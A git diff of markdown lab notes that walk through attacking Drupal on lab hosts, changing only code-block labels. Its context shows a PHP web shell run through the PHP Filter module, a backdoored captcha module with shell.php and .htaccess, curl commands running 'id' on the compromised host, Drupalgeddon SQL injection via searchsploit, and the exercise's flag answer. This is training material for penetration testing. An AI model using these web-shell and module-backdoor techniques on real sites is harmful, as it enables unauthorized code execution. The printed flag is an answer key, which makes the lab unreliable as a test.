@@ -14,7 +14,7 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 
 We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3.
 
-```sh
+```shellsession
 $ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -22,7 +22,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. 
 
-```sh
+```shellsession
 $ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 ```
 
@@ -37,7 +37,7 @@ Drupal allows users with appropriate permissions to upload a new module. A backd
 
 Download the archive and extract its contents.
 
-```sh
+```shellsession
 $ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 $ tar xvf captcha-8.x-1.2.tar.gz
 ```
@@ -61,7 +61,7 @@ RewriteBase /
 
 The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
 
-```sh
+```shellsession
 $ mv shell.php .htaccess captcha
 $ tar cvf captcha.tar.gz captcha/
 ```
@@ -70,7 +70,7 @@ Assuming we have administrative access to the website, click on `Manage` and the
 
 Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
 
-```sh
+```shellsession
 $ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 ```
 
@@ -78,7 +78,7 @@ $ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b
 1. Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory. **Answer: DrUp@l_drUp@l_3veryWh3Re!**
    - Identify the drupal version:
    - Execute the `'Drupalgeddon' SQL Injection` to inject an admin user (`admin`:`admin`):
-        ```sh
+        ```shellsession
         $ searchsploit drupal
         <SNIP>
         Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Inject | php/webapps/34992.py
